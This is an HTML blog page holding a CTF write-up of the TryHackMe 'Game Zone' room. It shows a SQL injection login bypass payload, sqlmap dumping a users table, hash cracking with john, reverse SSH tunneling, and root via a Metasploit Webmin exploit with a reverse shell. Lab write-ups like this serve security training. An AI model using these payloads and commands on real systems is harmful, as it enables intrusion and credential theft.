@@ -1,0 +1,359 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>Game Zone :: northmatrix</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Overview GameZone is a Hitman themed TryHackMe room focused on exploiting SQL injection vulnerabilities, cracking password hashes, tunneling services via reverse SSH, and ultimately achieving root through Webmin RCE. Note that all parts except the last of this CTF are guided.
+Obtaining Access We are tasked with gaining access to restricted part of web page.
+We have been told that the username and password form uses a SQL query to validate login authenticity.
+" />
+<meta name="keywords" content="" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="//localhost:1313/posts/2025-07-07-game-zone/" />
+
+
+
+
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/buttons.min.86f6b4c106b6c6eb690ae5203d36b442c1f66f718ff4e8164fa86cf6c61ad641.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/code.min.d529ea4b2fb8d34328d7d31afc5466d5f7bc2f0bc9abdd98b69385335d7baee4.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/fonts.min.5bb7ed13e1d00d8ff39ea84af26737007eb5051b157b86fc24487c94f3dc8bbe.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/footer.min.eb8dfc2c6a7eafa36cd3ba92d63e69e849e2200e0002a228d137f236b09ecd75.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/gist.min.a751e8b0abe1ba8bc53ced52a38b19d8950fe78ca29454ea8c2595cf26aad5c0.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/header.min.75c7eb0e2872d95ff48109c6647d0223a38db52e2561dd87966eb5fc7c6bdac6.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/main.min.36833afd348409fc6c3d09d0897c5833d9d5bf1ff31f5e60ea3ee42ce2b1268c.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/menu.min.3c17467ebeb3d38663dce68f71f519901124fa5cbb4519b2fb0667a21e9aca39.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/pagination.min.bbb986dbce00a5ce5aca0504b7925fc1c581992a4bf57f163e5d69cc1db7d836.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/post.min.e6dddd258e64c83e05cec0cd49c05216742d42fc8ecbfbe6b67083412b609bd3.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/syntax.min.a0773cce9310cb6d8ed23e50f005448facf29a53001b57e038828daa466b25c0.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/terminal.min.e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855.css">
+
+  
+  <link rel="stylesheet" href="//localhost:1313/css/terms.min.b81791663c3790e738e571cdbf802312390d30e4b1d8dc9d814a5b5454d0ac11.css">
+
+
+<link rel="stylesheet" href="//localhost:1313/terminal.css">
+
+
+
+
+<link rel="shortcut icon" href="//localhost:1313/favicon.png">
+<link rel="apple-touch-icon" href="//localhost:1313/apple-touch-icon.png">
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="northmatrix.github.io" />
+  
+    <meta name="twitter:creator" content="northmatrix" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Game Zone">
+<meta property="og:description" content="Overview GameZone is a Hitman themed TryHackMe room focused on exploiting SQL injection vulnerabilities, cracking password hashes, tunneling services via reverse SSH, and ultimately achieving root through Webmin RCE. Note that all parts except the last of this CTF are guided.
+Obtaining Access We are tasked with gaining access to restricted part of web page.
+We have been told that the username and password form uses a SQL query to validate login authenticity.
+" />
+<meta property="og:url" content="//localhost:1313/posts/2025-07-07-game-zone/" />
+<meta property="og:site_name" content="northmatrix" />
+
+  <meta property="og:image" content="//localhost:1313/og-image.png">
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+  <meta property="article:section" content="tryhackme" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <link rel="stylesheet" href="/css/syntax.css">
+</head>
+<body>
+
+
+<div class="container full">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Northmatrix
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="/showcase">Showcase</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/about" >About</a></li>
+        
+      
+        
+          <li><a href="/showcase" >Showcase</a></li>
+        
+      
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="//localhost:1313/posts/2025-07-07-game-zone/">Game Zone</a>
+  </h1>
+  <div class="post-meta"><span class="post-author">northmatrix</span><span class="post-reading-time">5 min read (861 words)</span></div>
+
+  
+    <span class="post-tags">
+      
+      #<a href="//localhost:1313/tags/sqli/">sqli</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/ssh/">ssh</a>&nbsp;
+      
+      #<a href="//localhost:1313/tags/metasploit/">metasploit</a>&nbsp;
+      
+    </span>
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h2 id="overview">Overview<a href="#overview" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>GameZone is a Hitman themed TryHackMe room focused on exploiting SQL injection vulnerabilities, cracking password hashes, tunneling services via reverse SSH, and ultimately achieving root through Webmin RCE. Note that all parts except the last of this CTF are guided.</p>
+<p><img src="Pasted%20image%2020250710010218.png" alt=""></p>
+<h2 id="obtaining-access">Obtaining Access<a href="#obtaining-access" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>We are tasked with gaining access to restricted part of web page.</p>
+<p>We have been told that the username and password form uses a SQL query to validate login authenticity.</p>
+<p>We have been given the SQL statement that is to be executed as follows.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="k">WHERE</span><span class="w"> </span><span class="n">username</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">:</span><span class="n">username</span><span class="w"> </span><span class="k">AND</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="p">:</span><span class="o">=</span><span class="w"> </span><span class="n">password</span><span class="w">
+</span></span></span></code></pre></div><p>We can see that from this statement there is an opportunity for a <strong>SQL Authentication Bypass</strong>.</p>
+<p>We can test this by entering the username as <code>'OR 1=1; --</code> and our password as <code>Anything</code>.</p>
+<p>We have <strong>Successfully</strong> gained access. And are now on a page with dir <code>portal.php</code>.</p>
+<h2 id="data-ex-filtration-using-sqlmap">Data Ex-filtration Using Sqlmap<a href="#data-ex-filtration-using-sqlmap" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>We have been told that using SQL map on the earlier used form is a good idea. Lets try it.</p>
+<p>First we capture the request using burp suite and then we can save it as a file to use with sqlmap.</p>
+<p>Below is the file and the command i used.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@ip-10-10-175-193:~# sqlmap -r req.txt -p searchitem --dump
+</span></span></code></pre></div><p>And this is the request i fed to it.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/portal.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">10.10.154.221</span>
+</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">en-US,en;q=0.5</span>
+</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate, br</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">14</span>
+</span></span><span class="line"><span class="cl"><span class="n">Origin</span><span class="o">:</span> <span class="l">http://10.10.154.221</span>
+</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">keep-alive</span>
+</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://10.10.154.221/portal.php</span>
+</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=6vdl1er63fsrjtp98vl21cnkm6</span>
+</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Priority</span><span class="o">:</span> <span class="l">u=0, i</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">searchitem=sus
+</span></span></code></pre></div><p>After letting sqlmap run for a while it dumped a table to the screen called <code>users</code> with the columns <code>pwd</code> and <code>username</code> with one record present.</p>
+<p>There was also one other table named <code>post</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">+------------------------------------------------------------------+----------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> <span class="nb">pwd</span>                                                              <span class="p">|</span> username <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+------------------------------------------------------------------+----------+
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ab5db91*************************************************2c3efd14 <span class="p">|</span> agent47  <span class="p">|</span>
+</span></span><span class="line"><span class="cl">+------------------------------------------------------------------+----------+
+</span></span></code></pre></div><h2 id="cracking-the-hashed-password">Cracking the Hashed Password<a href="#cracking-the-hashed-password" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>We are then told that we may be able to use john the ripper to obtain the plain-text of the hash so we first detect the hash type using hashinator.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@ip-10-10-175-193:~# hashinator -t ab5db91*************************************************2c3efd14
+</span></span></code></pre></div><p>Now we know the hash type is sha256 we can feed it into john using the following command.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@ip-10-10-175-193:~# john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt --format<span class="o">=</span>raw-sha256 passwd.hash
+</span></span></code></pre></div><p>We get an output from this with the corresponding plain-text of <code>vi*********24</code></p>
+<p>We are now told we can ssh into the machine. <code>ssh agent47@10.10.154.221</code></p>
+<p>After doing so we see a flag in the home dir.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">agent47@gamezone:~$ cat user.txt
+</span></span><span class="line"><span class="cl">649ac1****************************ac95c
+</span></span></code></pre></div><h2 id="exposing-services-with-reverse-ssh-tunnels">Exposing Services with Reverse Ssh Tunnels<a href="#exposing-services-with-reverse-ssh-tunnels" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<h3 id="reverse-ssh-port-forwarding">Reverse SSH Port Forwarding<a href="#reverse-ssh-port-forwarding" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>Reverse SSH port forwarding specifies that a given port on the remote server host is to be forwarded to the given host port on the client side.</p>
+<p>-L specifies a tunnel (YOU &lt;- CLIENT) meaning that if a site was blocked at work you could run <code>ssh -L 9000:imgur.com:80 user@example.com.</code> and then visit the blocked site on port 9000.</p>
+<p>-R alternatively specifies a remote tunnel (YOU -&gt; CLIENT) You forward you traffic to the server for others to view.</p>
+<h3 id="using-ss-to-find-running-services">Using Ss to Find Running Services<a href="#using-ss-to-find-running-services" class="hanchor" ariaLabel="Anchor">#</a> </h3>
+<p>We first run</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">agent47@gamezone:~$ ss -tulpn
+</span></span></code></pre></div><p>This will give us a list of TCP, UDP, Listening Sockets, As well as the Processes running without resolving the service names.</p>
+<p>We can see that <em>5</em> services are running.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">agent47@gamezone:~$ ss -tulpn
+</span></span><span class="line"><span class="cl">Netid  State      Recv-Q Send-Q    Local Address:Port                   Peer Address:Port
+</span></span><span class="line"><span class="cl">udp    UNCONN     <span class="m">0</span>      <span class="m">0</span>                     *:10000                             *:*
+</span></span><span class="line"><span class="cl">udp    UNCONN     <span class="m">0</span>      <span class="m">0</span>                     *:68                                *:*
+</span></span><span class="line"><span class="cl">tcp    LISTEN     <span class="m">0</span>      <span class="m">128</span>                   *:10000                             *:*
+</span></span><span class="line"><span class="cl">tcp    LISTEN     <span class="m">0</span>      <span class="m">128</span>                   *:22                                *:*
+</span></span><span class="line"><span class="cl">tcp    LISTEN     <span class="m">0</span>      <span class="m">80</span>            127.0.0.1:3306                              *:*
+</span></span><span class="line"><span class="cl">tcp    LISTEN     <span class="m">0</span>      <span class="m">128</span>                  :::80                               :::*
+</span></span><span class="line"><span class="cl">tcp    LISTEN     <span class="m">0</span>      <span class="m">128</span>                  :::22                               :::*
+</span></span></code></pre></div><p>In the above we can see that there are services running on port <code>10000</code> <code>68</code> and on localhost port <code>3306</code> after creating a remote tunnel to each i was then able to see the following.</p>
+<ul>
+<li>Nothing particular on port 3306 just a message about packets out of order.</li>
+<li>Nothing on port 3306.</li>
+<li>A webmin admin login, This is interesting.</li>
+</ul>
+<p>Webmin is a web based system administration tool.</p>
+<p>I was not able to find the version by looking at page source so i instead ran a <code>nmap</code> scan on localhost targeting the remote tunnel on port 10000.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">root@ip-10-10-175-193:~# nmap localhost -p <span class="m">10000</span> -sV -T5
+</span></span><span class="line"><span class="cl">Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2025-07-06 19:55 BST
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> localhost <span class="o">(</span>127.0.0.1<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.000068s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Other addresses <span class="k">for</span> localhost <span class="o">(</span>not scanned<span class="o">)</span>: ::1
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">10000/tcp open  http    MiniServ 1.580 <span class="o">(</span>Webmin httpd<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl">Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 36.73 seconds
+</span></span></code></pre></div><p>As you can see it is running version <strong>1.580</strong>.</p>
+<h2 id="privilege-escalation-using-metasploit">Privilege Escalation Using Metasploit<a href="#privilege-escalation-using-metasploit" class="hanchor" ariaLabel="Anchor">#</a> </h2>
+<p>This part of the CTF is unguided so i will begin as follows.</p>
+<p>First i will use searchsploit to attempt to find exploits for the version of webmin that i am dealing with.</p>
+<p>I then found a exploit available in metasploit which i proceeded to use.</p>
+<p>In particular i used the <em>unix/webapp/webmin_show_cgi_exec</em> exploit.</p>
+<p>And filled in the required options note that RHOST was localhost due to the ssh tunnel we are using.</p>
+<p>I chose the python revershell payload.</p>
+<p>After running i switched to the created session using <code>session -i 1</code> then simply catted the root flag.</p>
+
+      </div></div>
+
+  
+    
+<div class="pagination">
+  <div class="pagination__title">
+    <span class="pagination__title-h">Read other posts</span>
+    <hr />
+  </div>
+  <div class="pagination__buttons">
+    
+      <a href="//localhost:1313/posts/2025-07-09-daily-bugle/" class="button inline prev">
+        &lt; [<span class="button__text">Daily Bugle</span>]
+      </a>
+    
+    
+      ::
+    
+    
+      <a href="//localhost:1313/posts/2025-07-20-jack/" class="button inline next">
+         [<span class="button__text">Jack</span>] &gt;
+      </a>
+    
+  </div>
+</div>
+
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
